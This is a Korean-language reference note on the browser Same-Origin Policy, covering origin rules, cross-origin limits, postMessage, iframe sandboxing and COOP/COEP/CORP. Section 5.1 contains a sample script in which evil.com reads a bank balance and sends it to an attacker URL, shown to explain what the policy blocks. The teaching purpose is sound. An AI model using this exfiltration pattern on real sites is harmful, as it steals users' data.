---
title: "Same-Origin Policy (SOP)"
kind: knowledge
project: computer-science
agent: engineering-agent/tech-lead
status: current
created_at: 2026-05-13T23:10:00+09:00
tags:
  - network
  - http
  - cors
  - sop
  - security
---

# Same-Origin Policy (SOP)

| 문서 버전 | 작성일 | 작성자 | 주요 변경 사항 |
| --- | --- | --- | --- |
| v.1.0.0 | 2026-05-13 | engineering-agent/tech-lead | SOP 의 정의 / 의미 / 예외 |

**[[cors|↑ CORS]]** · **[[../http|↑↑ HTTP]]**

---

## 1. 한 줄 정의

**다른 origin 의 자원에 대한 JS 접근 제한** — 1996 Netscape 도입. 모든 모던
브라우저의 기본 보안.

---

## 2. Origin

```
Origin = scheme + host + port
```

### 같은 origin
```
https://example.com/page1
https://example.com/page2
https://example.com/api/users
```

### 다른 origin
```
https://example.com   vs  http://example.com    (scheme 차이)
https://example.com   vs  https://other.com     (host 차이)
https://example.com   vs  https://example.com:8080  (port 차이)
https://example.com   vs  https://sub.example.com   (subdomain 차이)
```

→ scheme / host / port 중 하나만 달라도 다른 origin.

---

## 3. SOP 의 제약 (Cross-origin 시)

### 3.1 XHR / fetch
```javascript
fetch('https://other.com/api')
// → CORS 헤더 없으면 응답 read X
```

### 3.2 iframe
```html
<iframe src="https://other.com"></iframe>
// 표시 OK
// JS: iframe.contentDocument → SecurityError
```

### 3.3 window.opener / window.parent
```javascript
window.opener.document.body    // 다른 origin 이면 X
```

### 3.4 Canvas + cross-origin image
```javascript
canvas.drawImage(crossOriginImage, 0, 0);
canvas.toDataURL();  // SecurityError — "tainted"
```

→ 이미지 그리기는 OK, pixel data 읽기는 X.

### 3.5 localStorage / sessionStorage
- Origin 별 분리 — 다른 origin 의 storage 접근 X

### 3.6 Cookie
- Domain 속성에 따라 — SOP 가 아니라 별도 규칙
- SameSite 등 보안 헤더

---

## 4. SOP 가 허용하는 것 (Cross-origin OK)

### 4.1 Link / Form submission
```html
<a href="https://other.com">link</a>          ← OK (navigation)
<form action="https://other.com" method="POST">  ← submit OK
```

→ 응답 읽기는 X. Navigation 만.

### 4.2 Image
```html
<img src="https://other.com/photo.jpg">         ← display OK
```

→ Display OK, read X.

### 4.3 Script
```html
<script src="https://other.com/lib.js"></script>  ← 실행 OK
```

→ JSONP 가 이 동작 활용 (legacy).

### 4.4 CSS
```html
<link rel="stylesheet" href="https://cdn.com/style.css">  ← OK
```

### 4.5 Font / Video / Audio
```html
<video src="https://other.com/video.mp4">       ← OK
```

### 4.6 WebSocket / WebRTC
- 자체 origin 정책 — SOP 와 별개

---

## 5. SOP 의 동기

### 5.1 시나리오 — SOP 없으면

```javascript
// 공격자 사이트 (evil.com) 의 JS
fetch('https://bank.com/api/balance')  // 사용자 쿠키 자동 동봉
  .then(r => r.json())
  .then(data => fetch('https://evil.com/steal?balance=' + data.balance));
```

→ 사용자가 bank.com 에 로그인 + evil.com 방문 → 잔액 도난.

### 5.2 SOP 의 역할
- JS 가 cross-origin 응답 읽기 X
- 데이터 도난 차단

---

## 6. Origin 의 정확한 정의 (RFC 6454)

### 6.1 정식 정의

```
Origin = (scheme, host, port)
```

### 6.2 Special cases

- **file://** — origin 자체가 file (브라우저별 다름)
- **about:blank** — opener 의 origin
- **data:** — opaque origin (모든 페이지가 다른 origin)
- **blob:** — 생성한 페이지의 origin

### 6.3 Same Site vs Same Origin

```
Same Origin: scheme + host + port 모두 같음
Same Site:   scheme + eTLD+1 같음 (subdomain OK)

example.com 과 api.example.com:
  Same Origin? NO
  Same Site?   YES
```

→ SameSite cookie 는 Site 기준, SOP 는 Origin 기준.

---

## 7. document.domain (deprecated)

옛 — subdomain 간 SOP 우회:

```javascript
// app.example.com 과 api.example.com
document.domain = 'example.com';  // 양 페이지에 설정 시 같은 origin 으로

// → cross-origin JS 가능 (subdomain 사이)
```

⚠️ Chrome 109+ 부터 **deprecated** — 보안 문제.

대체:
- **postMessage** (window.postMessage)
- **CORS** (정식 cross-origin)

---

## 8. postMessage — Cross-origin 통신

```javascript
// app.example.com
const iframe = document.querySelector('iframe');
iframe.contentWindow.postMessage(
  {type: 'login', user: 'alice'},
  'https://api.example.com'  // 명시 targetOrigin
);

// api.example.com (iframe)
window.addEventListener('message', (event) => {
  if (event.origin !== 'https://app.example.com') return;  // 검증
  console.log(event.data);
});
```

→ SOP 우회의 정식 방법 (단방향 메시지).

---

## 9. iframe sandboxing

```html
<iframe src="..." sandbox="allow-scripts allow-same-origin"></iframe>
```

### sandbox flags
- `allow-scripts` — JS 실행
- `allow-same-origin` — SOP 적용
- `allow-forms` — form submit
- `allow-popups` — window.open
- `allow-top-navigation` — top window 변경

### 효과
- `sandbox` 자체 — opaque origin 으로 격리
- 위험한 콘텐츠 (사용자 입력 HTML 등) 안전 표시

---

## 10. COOP / COEP — 강화된 격리

### COOP — Cross-Origin Opener Policy
```http
Cross-Origin-Opener-Policy: same-origin
```

- 다른 origin 이 `window.opener` 통해 자기 봄 차단
- Spectre 류 사이드 채널 방어

### COEP — Cross-Origin Embedder Policy
```http
Cross-Origin-Embedder-Policy: require-corp
```

- 임베드된 자원 모두 CORP 헤더 / CORS 필수
- SharedArrayBuffer 사용 조건

### CORP — Cross-Origin Resource Policy
```http
Cross-Origin-Resource-Policy: same-origin
```

- 다른 origin 의 임베드 차단

→ Spectre 이후 새 보안 모델 (cross-origin isolation).

자세히 → [[../security/security]]

---

## 11. 함정

### 함정 1 — Subdomain 도 다른 origin
`example.com` 과 `www.example.com` — 다른 origin.

### 함정 2 — Port 무시
`https://example.com` = `https://example.com:443` 만. `:8080` 은 다름.

### 함정 3 — http vs https
다른 origin. https 강제 (HSTS).

### 함정 4 — IP vs 도메인
`127.0.0.1:3000` 과 `localhost:3000` — 다른 origin.

### 함정 5 — SOP 가 보안 메커니즘 가정
브라우저만 — 서버는 직접 요청 가능. CORS / CSRF 분리 이해.

### 함정 6 — document.domain 사용
deprecated — postMessage 사용.

---

## 12. 학습 자료

- **RFC 6454** (Web Origin)
- MDN Same-Origin Policy
- "Same-Origin Policy" — W3C
- "Cross-Origin Isolation" — web.dev

---

## 13. 관련

- [[cors]] — CORS hub
- [[simple-request]] / [[preflight]] — SOP 의 우회 메커니즘
- [[../security/security]] — COOP / COEP / CORP
- [[../cookies/cookie-attributes]] — SameSite
